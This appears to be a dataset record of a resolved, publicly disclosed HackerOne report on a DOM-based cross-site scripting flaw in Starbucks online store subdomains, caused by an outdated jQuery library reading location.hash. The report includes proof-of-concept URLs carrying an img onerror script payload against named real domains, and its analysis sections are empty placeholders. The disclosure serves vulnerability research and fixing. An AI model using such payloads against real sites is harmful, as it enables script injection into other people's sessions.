---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '188185'
original_report_id: '188185'
title: Dom Based Xss DIV.innerHTML  parameters store.starbucks*
weakness: Cross-site Scripting (XSS) - Generic
team_handle: starbucks
created_at: '2016-12-04T10:44:58.569Z'
disclosed_at: '2017-01-12T22:33:36.723Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Dom Based Xss DIV.innerHTML  parameters store.starbucks*

## Metadata

- HackerOne Report ID: 188185
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: starbucks
- Disclosed At: 2017-01-12T22:33:36.723Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi! this subdomain store.starbucks* vulnerable to dom based xss. 
you are using the vulnerable library jQuery.V1_10_1	
parameters location.hash DIV.innerHTML .
Vulnerable all subdomains store.starbucks*
It works Chrome,and IE 11 the current version
POC
http://shop.starbucks.de/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
http://store.starbucks.ca/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
http://store.starbucks.fr/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
http://store.starbucks.co.uk/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
